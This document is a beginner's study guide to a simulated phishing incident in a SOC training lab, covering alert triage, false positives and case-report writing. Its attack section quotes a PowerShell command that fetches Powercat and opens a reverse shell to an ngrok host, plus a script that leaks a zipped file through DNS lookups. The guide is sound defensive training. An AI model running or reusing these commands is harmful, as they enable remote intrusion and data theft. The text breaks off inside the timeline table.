# Phishing Unfolding

### **Scenario overview**

Dive into the heat of a live phishing attack as it unfolds within the corporate network. In this high-pressure scenario, your role is to meticulously analyse and document each phase of the breach as it happens.

Can you piece together the attack chain in real-time and prepare a comprehensive report on the malicious activities?

### **Scenario objectives**

- Monitor and analyse real-time alerts as the attack unfolds.
- Identify and document critical events such as PowerShell executions, reverse shell connections, and suspicious DNS requests.
- Create detailed case reports based on your observations to help the team understand the full scope of the breach.

[https://www.youtube.com/watch?v=Ibg3z1QZE1s](https://www.youtube.com/watch?v=Ibg3z1QZE1s)

[https://www.youtube.com/watch?v=GseSJWFx1oM&t=2338s](https://www.youtube.com/watch?v=GseSJWFx1oM&t=2338s)

# Phishing Unfolding: Beginner's Study Guide

*TryHackMe SOC Simulator, Medium difficulty. Written for someone who wants to understand the room, not just finish it.*

---

## Table of Contents

1. [What this room is](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#1-what-this-room-is)
2. [Words you need to know](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#2-words-you-need-to-know)
3. [The big picture: the attack in one page](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#3-the-big-picture-the-attack-in-one-page)
4. [How a SOC analyst thinks (the workflow)](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#4-how-a-soc-analyst-thinks-the-workflow)
5. [How to write a good report](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#5-how-to-write-a-good-report)
6. [Master table: every alert at a glance](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#6-master-table-every-alert-at-a-glance)
7. [Group A: Spam and scam emails](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#7-group-a-spam-and-scam-emails)
8. [Group B: Normal Windows processes (false positives)](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#8-group-b-normal-windows-processes-false-positives)
9. [Group C: The real attack](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#9-group-c-the-real-attack)
10. [The full attack timeline](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#10-the-full-attack-timeline)
11. [MITRE ATT&CK mapping](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#11-mitre-attck-mapping)
12. [SIEM searches that mattered](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#12-siem-searches-that-mattered)
13. [Lessons the room teaches](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#13-lessons-the-room-teaches)
14. [Common report mistakes and fixes](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#14-common-report-mistakes-and-fixes)
15. [Self-quiz](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#15-self-quiz)
16. [Notes on sources and gaps](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#16-notes-on-sources-and-gaps)

---

## 1. What this room is

**Phishing Unfolding** is a simulation. You play a **SOC Level 1 analyst** at a fictional company called **PicoSecure** (the monitored company's mail domain is `tryhatme.com`).

Alerts keep arriving in a queue (about 35 in total, numbered from 1000). For each alert you must:

1. **Investigate**: read the alert, then search the SIEM for more context.
2. **Classify**: is it a **True Positive (TP)** or a **False Positive (FP)**?
3. **Decide**: does it need to be **escalated** to the incident response (IR) team?
4. **Write a case report** explaining your decision.

There are no question boxes and no answer key. You are graded on the **quality of your reports**, which is why the AI feedback focuses on context, reasoning, and precise indicators.

You can use one of three SIEMs: **Splunk**, **Microsoft Sentinel**, or **Elastic**. The tool changes, but the thinking stays the same.

**Why it feels hard:** alerts keep arriving while you work. Most are harmless noise, and a few are part of one real attack. Your job is to find the real attack without drowning.

---

## 2. Words you need to know

| Term | Simple meaning |
| --- | --- |
| **SOC** | Security Operations Center. The team that watches for attacks. |
| **SIEM** | A search tool that collects logs from all computers (Splunk, Sentinel, Elastic). |
| **Alert** | A warning created when a rule matches something suspicious. |
| **True Positive (TP)** | The alert is correct: something bad or unwanted really happened. |
| **False Positive (FP)** | The alert is wrong: the activity is normal. |
| **Escalate** | Hand the case to a more senior team (IR) because it is serious. |
| **Host** | A computer (e.g. `win-3450`). |
| **Process** | A running program. |
| **Parent process** | The program that started another program. |
| **Child process** | The program that was started. |
| **PID** | Process ID: a number identifying one running process. |
| **IOC / Indicator** | A piece of evidence: an IP, domain, filename, command, or file path. |
| **C2 / Command & Control** | The attacker's server that controls the infected machine. |
| **Reverse shell** | The victim's computer connects *out* to the attacker, giving the attacker a command line on it. |
| **Lateral movement** | Moving from one machine to another inside the network. |
| **Exfiltration** | Stealing data out of the network. |
| **Defense evasion** | Hiding or deleting evidence to avoid detection. |
| **Phishing** | A fake message designed to trick someone into acting (clicking, opening, giving info). |
| **Spam** | Unwanted bulk email. |
| **TLD** | The ending of a domain (`.com`, `.xyz`, `.online`). Cheap ones like `.xyz` are abused a lot. |
| **Defang** | Writing indicators safely so they can't be clicked: `evil[.]com`, `hxxp://`. |
| **LNK file** | A Windows shortcut. It can run commands while looking like a normal file. |
| **PowerShell** | A powerful Windows command-line tool, loved by admins and attackers. |
| **Base64** | A way to encode data as plain text. Not encryption, just encoding. |
| **DNS** | The system that turns names (`google.com`) into IP addresses. |
| **MITRE ATT&CK** | A public catalogue of attacker techniques with IDs like `T1566`. |

---

## 3. The big picture: the attack in one page

Most of the alerts are noise. **One real attack** is hiding inside:

```
  Fake invoice email (ZIP attachment)
            │
            ▼
  Michael opens ZIP, double-clicks "invioce.pdf.lnk"
            │
            ▼
  PowerShell downloads Powercat and opens a reverse shell
  to the attacker through ngrok
            │
            ▼
  Attacker explores the PC (whoami, net user, systeminfo)
            │
            ▼
  Attacker downloads PowerView to map Active Directory
            │
            ▼
  Attacker maps the financial share on FILESRV-01 as drive Z:
            │
            ▼
  Files copied (Robocopy) to a local "exfiltration" folder
            │
            ▼
  Drive Z: removed (covering tracks), files zipped
            │
            ▼
  Data sent out as DNS lookups to haz4rdw4re[.]io
  (this is what fires the ten High severity alerts)
            │
            ▼
  Attacker kills the shell and leaves
```

A second computer (`win-3455`, user `ashwin.johnston`) showed one early warning sign of the same technique.

---

## 4. How a SOC analyst thinks (the workflow)

For **every** alert, ask these questions in order:

1. **What does the alert say?** Read type, severity, time, host, user, process, and email details.
2. **Does it look normal?** Check the process path, parent, command line, and user.
3. **What else happened on that host or user?** Search the SIEM. *This step catches the real attack.*
4. **Have I seen this before?** Same domain, same host, same user, same pattern? (This is how you spot campaigns.)
5. **Is this host or user already part of an incident?** Keep a running list of "compromised hosts" and "known victims".
6. **Classify:** TP or FP, with evidence.
7. **Escalate?** Only if there is real impact or an active threat.
8. **Write the report.**

### Quick decision guide

```
Alert arrives
   │
   ├── Email alert?
   │      ├── Attachment or link? → investigate hard (check SIEM for what the user did)
   │      └── Spam/scam only? → TP, no escalation, recommend blocking
   │
   └── Process alert?
          ├── Path, parent and arguments all normal AND host is clean → FP
          └── Anything odd, OR host already compromised → TP / investigate / escalate
```

### Priority triage

When a flood of **High** severity alerts arrives from a host you already know is compromised, stop going in order. Handle by priority: **High, then Medium, then Low**. Alerts on a known-compromised host are part of the same incident.

---

## 5. How to write a good report

Your feedback said reports lacked **origin**, **specific systems/people**, **precise reasoning**, and **precise indicators**. Here is how to fix each.

### The five questions every report must answer

| Question | What to write |
| --- | --- |
| **What happened?** | The exact behaviour observed. |
| **Who and where?** | Host, user, sender, recipient, IPs, filenames. |
| **When?** | Event time from the SIEM (and alert time if different). |
| **Where did it come from?** | The **origin**: sender, parent process, source host, or the earlier event. |
| **So what?** | Why TP/FP, why escalate or not, and what the impact is. |

### The report fields (as used in the room)

| Field | What it needs |
| --- | --- |
| **Time of Activity** | Exact timestamp of the event. |
| **List of Affected Entities** | Hosts, users, processes (with PIDs), senders, recipients, files, domains. |
| **Reason for Classifying as TP/FP** | Evidence, not opinion. What you checked. |
| **Reason for Escalating** | The impact and risk. If not escalating, say why not. |
| **Recommended Remediation Actions** | Specific actions the next team can take. |
| **List of Attack Indicators** | Exact values: IPs, domains, hashes, commands, paths. |

### The escalation formula

> Escalating because **[specific evidence]** shows **[what the attacker achieved]**, on **[host/user]**, with **[impact/risk]**. IR should **[specific action]**.
> 

### Report writing rules

1. **Copy exact values** from the alert. Don't retype from memory.
2. **Defang indicators:** `haz4rdw4re[.]io`.
3. **Separate three things:** what you *observed*, what you *infer*, and what is *unverified*.
4. **Link related alerts:** "Part of the incident in alert 1005."
5. **Explain non-escalations too:** what you checked and found.
6. **Use cautious wording for weak evidence:** "indicator consistent with…", not "compromised".

### Weak vs strong wording

| Weak | Strong |
| --- | --- |
| "Suspicious activity on host" | "`powershell.exe` PID 3728 ran `net use Z: \\FILESRV-01\SSF-FinancialRecords` on `win-3450`" |
| "May be compromised" | "Compromise confirmed by [evidence]" or "Indicator consistent with X; unverified" |
| "Phishing email" | Sender, recipient, subject, attachment name, domain |
| "Block the domain" | "Block `haz4rdw4re[.]io` at DNS; search DNS logs for other hosts querying it" |
| "No escalation needed" | "Not escalated because [what you checked and found]" |
| "Normal Windows process" | "Runs from `C:\Windows\System32\`, correct parent, no unusual activity on the host in SIEM" |

---

## 6. Master table: every alert at a glance

*(Bold rows are part of the real attack.)*

| Alert | Type | Host / user | Verdict |
| --- | --- | --- | --- |
| 1000 | Suspicious Email from External Domain | support@ | TP, no escalation |
| 1001 | Suspicious Parent Child Relationship | win-3459 | FP |
| 1002 | Suspicious Parent Child Relationship | win-3451 | FP |
| 1003 | Suspicious Email from External Domain | yani.zubair | TP, no escalation |
| 1004 | Suspicious Email from External Domain | kyra.flores | TP, no escalation |
| **1005** | **Suspicious Attachment Found in Email** | **michael.ascot / win-3450** | **TP, ESCALATE** |
| **1006** | **Suspicious Parent Child Relationship** | **win-3450** | **TP, ESCALATE (context)** |
| 1007 | Suspicious Parent Child Relationship | win-3451 | FP |
| 1008 | Suspicious Parent Child Relationship | win-3455 | FP |
| 1009 | Suspicious Parent Child Relationship | win-3453 | FP |
| **1010** | **Suspicious Parent Child Relationship** | **win-3455 / ashwin.johnston** | **TP, ESCALATE** |
| 1011 | Suspicious Email from External Domain | michael.ascot | TP, no escalation |
| 1012 | Suspicious Parent Child Relationship | win-3459 | FP |
| 1013 | Suspicious Email from External Domain | armaan.terry | TP, no escalation |
| 1014 | Suspicious Email from External Domain | liam.espinoza | TP, no escalation |
| 1015 | Suspicious Parent Child Relationship | win-3449 | FP |
| 1016 | Suspicious Parent Child Relationship | win-3456 | FP |
| 1017 | Suspicious Email from External Domain | armaan.terry | TP, no escalation |
| 1018 | Suspicious Email from External Domain | liam.espinoza | TP, no escalation |
| 1019 | Suspicious Parent Child Relationship | win-3460 | FP |
| **1020** | **PowerShell Script in Downloads Folder** | **win-3450** | **TP, ESCALATE** |
| 1021 | Suspicious Parent Child Relationship | win-3451 | FP |
| **1022** | Network share access | **win-3450** | **TP, ESCALATE** |
| 1023 | *Not covered by the source walkthrough* | n/a | See [Section 16](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#16-notes-on-sources-and-gaps) |
| **1024** | Drive unmapped | **win-3450** | **TP, ESCALATE** |
| **1025–1034** | **Suspicious Parent Child Relationship (High)** | **win-3450** | **TP, ESCALATE** |

### Event times for the alerts that were documented

| Alert | Time of activity |
| --- | --- |
| 1007 | 06/11/2026 06:21:18 |
| 1008 | 06:23:10 |
| 1009 | 06:23:58 |
| 1010 | 06:27:14 |
| 1011 | 06:30:10 |
| 1012 | 06:32:47 |
| 1013 | 06:34:50 |
| 1014 | 06:37:11 |
| 1015 / 1016 | 06:37:45 |
| 1017 / 1018 | 06:37:54 to 06:38:26 |
| 1019 / 1021 | 06:38:47 to 06:41:57 |
| 1020 | 06:40:46 |
| 1022 | 06:42:41 |
| 1024 | 06:43:39 |

> **Note on times:** alert times (06:xx) and the SIEM event times for the attack (14:xx to 15:xx) look different in the walkthrough. It does not explain why. In your reports, say which clock you are quoting.
> 

---

## 7. Group A: Spam and scam emails

**Alerts:** 1000, 1003, 1004, 1011, 1013, 1014, 1017, 1018

### What these are

Unwanted emails that try to scam people: fake inheritances, "get rich" offers, work-from-home schemes. They are **true positives** (the alert is right that the email is bad) but **not escalated** because:

- There is **no attachment** and **no link**, so no malware delivery.
- There is **no sign** the recipient interacted with it.

### What to check

1. Sender address and **domain** (odd TLDs like `.xyz`, `.online`, `.me` are a flag).
2. Subject and content (urgency, money, fear, greed).
3. Attachment? Link? (If yes, treat as a possible phishing attack.)
4. **Is the same domain sending to other employees?** That means a campaign.
5. In the SIEM, did the recipient's computer contact the domain or run anything from Outlook?

### Alert-by-alert

| Alert | Sender → Recipient | Notes |
| --- | --- | --- |
| **1000** | `eileen@trendymillinery[.]co[.]me` → `support@tryhatme.com` | "Inheritance" scam asking for banking details. Low severity, first alert in queue. |
| **1003** | `leonard@fashionindustrytrends[.]xyz` → `yani.zubair@tryhatme.com` | "Secret formula" get-rich lure. `.xyz` domain. |
| **1004** | `osman@fashionindustrytrends[.]xyz` → `kyra.flores@tryhatme.com` | **Same domain as 1003, different target.** This confirms a spam campaign. |
| **1011** | `keane@modernmillinerygroup[.]online` → `michael.ascot@tryhatme.com` | Spam. The recipient's workstation is already a confirmed victim from 1005, so mention that. The email is **not** part of the attack chain. |
| **1013** | `griffin@hatventuresworldwide[.]online` → `armaan.terry@tryhatme.com` | Work-from-home scam. |
| **1014** | `odom@gmail.com` → `liam.espinoza@tryhatme.com` | Fake promotion from **Gmail**. Don't block `gmail.com`. Mark as spam. |
| **1017** | `stone@fashionindustrytrends[.]xyz` → `armaan.terry@tryhatme.com` | **Third** email from this domain (see 1003, 1004). |
| **1018** | `combs@hatventuresworldwide[.]online` → `liam.espinoza@tryhatme.com` | **Second** email from this domain (see 1013). |

### Model report (alert 1004)

> **Time of Activity:** *(event time from the alert)*
> 
> 
> **List of Affected Entities:** Sender `osman@fashionindustrytrends[.]xyz`; recipient `kyra.flores@tryhatme.com`; domain `fashionindustrytrends[.]xyz`.
> 
> **Reason for Classifying as True Positive:** Unsolicited email with a get-rich-quick lure from a `.xyz` domain. This is the second email from this domain (see alert 1003), sent to a different employee, indicating a spam campaign rather than an isolated email.
> 
> **Reason for Not Escalating:** The email contains no attachment or URL. A SIEM search on the recipient's host found no DNS requests to the domain and no processes spawned from Outlook, so there is no evidence of interaction.
> 
> **Recommended Remediation Actions:** Block `fashionindustrytrends[.]xyz` at the email gateway. Search mail logs for other recipients.
> 
> **List of Attack Indicators:** `fashionindustrytrends[.]xyz`; subject "Grow Your Hat Business Overnight with this Secret Formula."
> 

### Tips

- Say "spam/scam domain", not "malicious domain", unless you have evidence of malware.
- For repeat domains, **cite the earlier alert numbers**.
- For Gmail or other legitimate providers, don't recommend blocking the whole domain.

---

## 8. Group B: Normal Windows processes (false positives)

**Alerts:** 1001, 1002, 1007, 1008, 1009, 1012, 1015, 1016, 1019, 1021

### The concept: parent and child processes

Every program on Windows is started by another program (its **parent**). Some parent/child pairs are completely normal. Others are red flags, like `iexplore.exe` starting `rundll32.exe` from a user's Desktop.

The detection rule in this room, **"Suspicious Parent Child Relationship"**, is noisy. It fires on harmless pairs. Your job is to check each one and prove it is harmless.

### The FP checklist

| Check | Normal looks like |
| --- | --- |
| **Path** | `C:\Windows\System32\` (or another expected Windows folder) |
| **Parent** | The expected Windows service (`services.exe`, `svchost.exe`) |
| **Command line** | The expected arguments |
| **User** | `SYSTEM` or a service account |
| **Host history** | No other odd activity on the same host in the SIEM |

### The harmless processes seen in this room

| Process ← Parent | What it really is | Alerts |
| --- | --- | --- |
| `TrustedInstaller.exe` ← `services.exe` | Windows Modules Installer. This is how Windows updates itself. | 1001 (win-3459), 1015 (win-3449) |
| `taskhostw.exe KEYROAMING` ← `svchost.exe` | Windows Task Host running a roaming-profile key sync task. | 1002, 1007, 1021 (win-3451); 1019 (win-3460) |
| `taskhostw.exe NGCKeyPregen` ← `svchost.exe` | Windows Hello key pre-generation. | 1016 (win-3456) |
| `WUDFHost.exe` ← `services.exe` | User-Mode Driver Framework host. The long GUIDs are device identifiers. | 1008 (win-3455) |
| `svchost.exe -k wsappx` ← `services.exe` | Service group for Microsoft Store app install and licensing. | 1012 (win-3459) |
| `rdpclip.exe` ← `svchost.exe` | Remote Desktop clipboard helper. Appears during RDP sessions. | 1009 (win-3453) |

### Model report (alert 1007)

> **Time of Activity:** 06/11/2026 06:21:18
> 
> 
> **List of Affected Entities:** Host `win-3451`; process `taskhostw.exe KEYROAMING` (PID 3945); parent process `svchost.exe` (PID 3652).
> 
> **Reason for Classifying as False Positive:** Legitimate Windows scheduled task for roaming-profile key synchronisation. It runs from `C:\Windows\System32\` with the correct parent and expected argument. A SIEM search on `host=win-3451` showed no unusual child processes, PowerShell activity, or outbound connections. Identical to alert 1002 on the same host.
> 
> **Recommended Remediation Actions:** Tune the detection rule to exclude this known-good pair.
> 

### Important lesson: 1008 vs 1010

Alert **1008** (`WUDFHost.exe` on `win-3455`) was closed as an FP because the process itself was harmless. Later, **alert 1010 on the same host** led to a SIEM search that revealed `ClearMyTracksByProcess` activity on that machine.

**The lesson:** search the host in the SIEM *before* closing even obvious FPs. A harmless process can sit on a host where something else is going on.

### Grouping

When several alerts share the same verdict and the same evidence, you can group them in one report (as done for 1015 and 1016, and 1019 and 1021). Still list each host and process.

---

## 9. Group C: The real attack

### Alert 1005: The phishing email (the entry point)

**Alert type:** Suspicious Attachment Found in Email

**What the alert shows:**

| Field | Value |
| --- | --- |
| Sender | `john@hatmakereurope[.]xyz` |
| Recipient | `michael.ascot@tryhatme.com` |
| Subject | "FINAL NOTICE: Overdue Payment - Account Suspension Imminent" |
| Attachment | `ImportantInvoice-Febrary.zip` |

**Red flags:**

- `.xyz` domain (same pattern as the spam).
- Aggressive urgency: "FINAL NOTICE", "legal action", "suspended today", "within 24 hours".
- A **ZIP** attachment, a classic way to carry malware.
- Typos: "Febrary" in the filename (and "Invioce" later).
- The recipient, `michael.ascot`, had already shown suspicious activity in the SIEM.

**Why this alert is different:** unlike the spam, **the SIEM proves the attachment was opened and executed.** Searching `host=win-3450` shows the whole chain (see [Section 10](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#10-the-full-attack-timeline)).

**The trick explained:** inside the ZIP was not a PDF but **`invioce.pdf.lnk`**. A `.lnk` is a shortcut that can run any command. It looks like a PDF to a hurried user. Clicking it ran this PowerShell:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
```

**Breaking down that command:**

| Part | Meaning |
| --- | --- |
| `IEX` | Invoke-Expression: run text as code. |
| `New-Object System.Net.WebClient` | Create a web downloader. |
| `.DownloadString('…powercat.ps1')` | Download the Powercat script into memory (nothing saved to disk, which helps it avoid antivirus). |
| `powercat` | A PowerShell version of netcat (a network tool). |
| `-c 2.tcp.ngrok.io -p 19282` | Connect to the attacker's ngrok address on port 19282. |
| `-e powershell` | Give the attacker a PowerShell prompt on the victim. |

**What is ngrok?** A legitimate service that exposes a private server to the internet. Attackers abuse it because the traffic can look like normal web traffic and the address changes easily.

**Confirmation of success:** the log shows `Connection to 2.tcp.ngrok.io:19282 [tcp] succeeded!` at 15:10:12. The attacker was in.

#### Model report (alert 1005)

> **Time of Activity:** 14:59:54 (phishing email opened) to 15:15:25 (attacker shell terminated). Reverse shell connection succeeded at 15:10:12.
> 
> 
> **List of Affected Entities:** User `michael.ascot`; host `win-3450`; sender `john@hatmakereurope[.]xyz`; `ImportantInvoice-Febrary.zip`; `invioce.pdf.lnk`; `powershell.exe`.
> 
> **Origin:** Phishing email with a ZIP attachment, opened in Outlook, containing a `.lnk` file disguised as a PDF.
> 
> **Reason for Classifying as True Positive:** SIEM logs on `win-3450` show the full execution chain. The ZIP was saved at 15:09:57 and `invioce.pdf.lnk` extracted at 15:10:08. At 15:10:09, PowerShell ran a command that downloaded Powercat from GitHub and connected to `2.tcp.ngrok.io:19282`. A successful connection was logged at 15:10:12.
> 
> **Reason for Escalating:** Confirmed code execution and an active interactive C2 session on a user workstation. Discovery commands followed (`systeminfo`, `whoami /priv`, `net user`, `net localgroup`), showing an attacker actively working in the environment.
> 
> **Recommended Remediation Actions:** Isolate `win-3450`. Reset `michael.ascot`'s credentials. Block `*.ngrok.io` and `hatmakereurope[.]xyz`. Remove the email from all mailboxes and identify other recipients. Review the host for persistence.
> 
> **List of Attack Indicators:** `hatmakereurope[.]xyz`; `ImportantInvoice-Febrary.zip`; `invioce.pdf.lnk`; `2[.]tcp[.]ngrok[.]io:19282` (resolved to `3[.]22[.]53[.]161`); `raw[.]githubusercontent[.]com/besimorhino/powercat/master/powercat.ps1` (resolved to `185[.]199[.]111[.]133`).
> 

---

### Alert 1006: `rdpclip.exe` on win-3450 (context is everything)

**Process:** `rdpclip.exe` ← `svchost.exe` on `win-3450`, around 14:51.

**Why it is interesting:** the *same* process was an FP on `win-3453` (alert 1009), where nothing else was wrong. On `win-3450`, a host showing signs of compromise, an unexplained RDP session deserves attention.

**A precision trap:** it is tempting to write "the attacker pivoted to RDP after the reverse shell". But in the SIEM timeline, `rdpclip` at **14:51** is *before* the email (14:59) and shell (15:10), so the timing does not support "after". Be careful with claims that your timestamps don't back up.

**Better wording:**

> **Reason for Classifying as True Positive:** `rdpclip.exe` indicates an RDP session on `win-3450`, a host with earlier defense-evasion activity (`ClearMyTracksByProcess` at 14:44:19). The source of the RDP session is unverified.
> 
> 
> **Reason for Escalating:** An unexplained RDP session on a host under investigation. IR should verify the source IP and logon events (Event ID 4624, logon type 10).
> 
> **Indicators:** `rdpclip.exe` ← `svchost.exe` on `win-3450`.
> 

---

### Alert 1010: win-3455 and ashwin.johnston (a possible second victim)

**What the alert said:** `WUDFHost.exe` ← `services.exe` on `win-3455`. Harmless on its own.

**What the SIEM showed:** searching `host=win-3455` revealed, at 06:09:39:

```
rundll32.exe ← iexplore.exe
ClearMyTracksByProcess
C:\Users\ashwin.johnston\Desktop\
```

This is the **same pattern** that opened the compromise on `win-3450` (14:44:19). Different host and user, same technique.

**Additional detail:** Outlook on `win-3455` queried `autodiscover.tryhatme.finance`, a **lookalike** of the real company domain (`tryhatme.com`). Worth flagging.

**What was *not* found:** no further malicious activity on `win-3455` in the available window.

**Model report:**

> **Time of Activity:** 06/11/2026 06:27:14 (alert); `ClearMyTracksByProcess` observed at 06:09:39.
> 
> 
> **List of Affected Entities:** Host `win-3455`; user `ashwin.johnston`; `iexplore.exe` (parent, PID 3596); `rundll32.exe` (PID 3692).
> 
> **Reason for Classifying as True Positive:** The alert process (`WUDFHost.exe`) is benign, but SIEM investigation found `rundll32.exe` spawned by `iexplore.exe` running `ClearMyTracksByProcess` from the user's Desktop. This matches the defense-evasion step that began the confirmed compromise on `win-3450` (alert 1005). No further malicious activity was found in the available window.
> 
> **Reason for Escalating:** Indicator consistent with a second victim of the same campaign. The attack on `win-3450` progressed to full data theft, so early action here matters.
> 
> **Recommended Remediation Actions:** Review `ashwin.johnston`'s mailbox for invoice/ZIP lures. Monitor `win-3455` for PowerShell and outbound connections to ngrok. Investigate the `autodiscover.tryhatme[.]finance` lookups.
> 
> **Indicators:** `rundll32.exe` ← `iexplore.exe` from `C:\Users\ashwin.johnston\Desktop\`; `ClearMyTracksByProcess`; `autodiscover.tryhatme[.]finance`.
> 

**Wording tip:** say "indicator consistent with…" here. The evidence supports suspicion, not confirmation.

---

### Alert 1020: PowerView.ps1 in Downloads

**Alert type:** PowerShell Script in Downloads Folder

**What happened:** at 15:11:20, `powershell.exe` **PID 9060** (the original reverse-shell process) created `C:\Users\michael.ascot\Downloads\PowerView.ps1`.

**What is PowerView?** A well-known tool for exploring **Active Directory**: it lists computers, users, groups, and network shares. Attackers use it to learn "what else is on this network, and what is valuable?"

**Why it matters:** it shows the attacker went from "I have a foothold" to "I'm mapping the company network".

**Model report:**

> **Time of Activity:** 06/11/2026 06:40:46 (alert); file created at 15:11:20 per SIEM.
> 
> 
> **List of Affected Entities:** `michael.ascot`; `win-3450`; `powershell.exe` (PID 9060); `C:\Users\michael.ascot\Downloads\PowerView.ps1`.
> 
> **Reason for Classifying as True Positive:** `PowerView.ps1`, a known AD reconnaissance tool, was created by PID 9060, the reverse-shell process from alert 1005. This shows post-exploitation reconnaissance by an attacker on a compromised host.
> 
> **Reason for Escalating:** Active attacker enumerating the domain. This led directly to discovery of `\\FILESRV-01\SSF-FinancialRecords` (alert 1022).
> 
> **Recommended Remediation Actions:** Remove the file. Review AD query logs for the scope of enumeration. Audit all shares accessed from `win-3450`.
> 
> **Indicators:** `C:\Users\michael.ascot\Downloads\PowerView.ps1`; PID 9060.
> 

---

### Alerts 1022, 1023, 1024: Share access, copy, and cleanup

| Alert | Command | Meaning |
| --- | --- | --- |
| **1022** (06:42:41) | `net use Z: \\FILESRV-01\SSF-FinancialRecords` | The attacker mapped the financial records share as drive **Z:**. Run by PowerShell **PID 3728**. |
| **1023** | *Not documented in the source walkthrough* | See [Section 16](https://claude.ai/chat/3cc57b2d-7ba5-4697-acef-c9116df19a8d#16-notes-on-sources-and-gaps). |
| **1024** (06:43:39) | `net use Z: /delete` | The attacker removed drive Z: to hide evidence. About 97 seconds after the share was mapped. |

**Between the two:** the SIEM shows **Robocopy** copying from Z: to `C:\Users\michael.ascot\downloads\exfiltration\` at 15:14:02. Two files landed there: `ClientPortfolioSummary.xlsx` and `InvestorPresentation2023.pptx`.

**Where did PID 3728 come from?** At 15:11:33 a new PowerShell process was launched with `-ExecutionPolicy Bypass` (which skips the rule that blocks unsigned scripts). That became PID 3728, the process that ran everything from here on.

**Model report (1022):**

> **Time of Activity:** 06/11/2026 06:42:41 (alert); command observed at 15:13:15 per SIEM.
> 
> 
> **List of Affected Entities:** `michael.ascot`; `win-3450`; `net.exe` (PID 5784); parent `powershell.exe` (PID 3728); `\\FILESRV-01\SSF-FinancialRecords`; `FILESRV-01`.
> 
> **Origin:** PowerShell session PID 3728, spawned during the attack chain from alert 1005.
> 
> **Reason for Classifying as True Positive:** `net use Z: \\FILESRV-01\SSF-FinancialRecords` was run by the attacker-controlled PowerShell process on a compromised host, mapping the financial records share as a local drive to stage files for theft.
> 
> **Reason for Escalating:** Attacker access to sensitive financial data on `FILESRV-01`. Files were subsequently copied and exfiltrated (alerts 1025 to 1034).
> 
> **Recommended Remediation Actions:** Audit `FILESRV-01` access logs for full scope. Isolate `FILESRV-01` pending investigation. Revoke `michael.ascot`'s credentials.
> 
> **Indicators:** `net use Z: \\FILESRV-01\SSF-FinancialRecords`; parent PowerShell PID 3728; host `win-3450`.
> 

**Model report (1024), key points to include:** command `net use Z: /delete`; PID 8004 (child of 3728); 97 seconds after mapping; 51 seconds before DNS exfiltration began; classification as defense evasion (covering tracks); same remediation as 1022.

---

### Alerts 1025 to 1034: DNS exfiltration (ten alerts, one event)

**Alert type:** Suspicious Parent Child Relationship, **High** severity. All fired at the same time from `win-3450`.

**Key insight:** this is **not ten attacks**. It is **one action** that triggered the same rule ten times.

**What happened:** `nslookup.exe`, spawned by `powershell.exe` from `C:\Users\michael.ascot\downloads\exfiltration\`, was called with a long random-looking string followed by `.haz4rdw4re.io`. Each alert is one chunk of stolen data.

The PowerShell used:

```powershell
$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("exfilt8me.zip"));
$base64 -split '(.{1,30})' | ForEach-Object {Invoke-Expression "nslookup $_.haz4rdw4re.io"}
```

**Step by step:**

1. Read the file `exfilt8me.zip` as bytes.
2. Convert it to **base64** (text).
3. Cut the text into **30-character chunks**.
4. For each chunk, run `nslookup <chunk>.haz4rdw4re.io`.
5. The attacker controls the DNS server for `haz4rdw4re.io`, so it logs every lookup.
6. Reassemble the chunks in order, and the original file is rebuilt.

**Why DNS?** Many networks watch web (HTTP) and file transfer (FTP) traffic closely but let DNS through. Data hidden inside DNS lookups can slip out unnoticed. This technique is **DNS exfiltration** (MITRE T1048.003).

**A second file was also stolen** the same way: `BitcoinWalletPasscodes.txt` from Michael's Downloads folder.

**Model report (write one full report, then reference it from the other nine):**

> **Time of Activity:** 15:15:00 per SIEM; all ten alerts within seconds.
> 
> 
> **List of Affected Entities:** `michael.ascot`; `win-3450`; `nslookup.exe`; parent `powershell.exe` (PID 3728); folder `C:\Users\michael.ascot\downloads\exfiltration\`; domain `haz4rdw4re[.]io`.
> 
> **Origin:** Attacker-controlled PowerShell session from the reverse shell in alert 1005, after files were copied from `FILESRV-01` (alert 1022).
> 
> **Reason for Classifying as True Positive:** `nslookup.exe` spawned by PowerShell with base64-looking subdomains of `haz4rdw4re[.]io`. The SIEM command line shows the script reading `exfilt8me.zip`, encoding it as base64, and sending 30-character chunks as DNS queries.
> 
> **Reason for Escalating:** Confirmed data theft (financial records and a file of credentials) by an attacker with an active C2 session.
> 
> **Recommended Remediation Actions:** Block `haz4rdw4re[.]io` at DNS. Search DNS logs for other hosts querying it. Isolate `win-3450`. Assess exposure of `FILESRV-01` data.
> 
> **Indicators:** `haz4rdw4re[.]io`; `exfilt8me.zip`; `BitcoinWalletPasscodes.txt`; PowerShell PID 3728; `nslookup.exe` with base64 subdomains.
> 

**For alerts 1026 to 1034:** short reports referencing the main one: "Same event as alert 1025, one chunk of the DNS exfiltration. Chunk value: `<paste from the alert>`. See full report."

---

## 10. The full attack timeline

*All times from SIEM logs on `win-3450` unless stated.*

| Time | Event | What it means |
| --- | --- | --- |
